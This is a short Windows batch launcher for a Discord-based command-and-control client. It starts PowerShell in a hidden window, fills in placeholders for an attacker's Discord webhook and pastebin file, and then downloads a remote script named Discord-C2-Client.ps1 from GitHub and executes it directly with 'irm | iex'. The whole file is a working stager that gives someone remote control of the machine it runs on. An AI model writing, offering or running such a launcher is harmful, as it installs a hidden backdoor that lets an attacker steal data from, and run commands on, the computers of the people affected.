@echo off
powershell.exe -NonI -NoP -W H -C "$hookurl='YOUR_WEBHOOK_HERE' ; $ghurl = 'YOUR_PASTEBIN_FILE_HERE' ; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex"
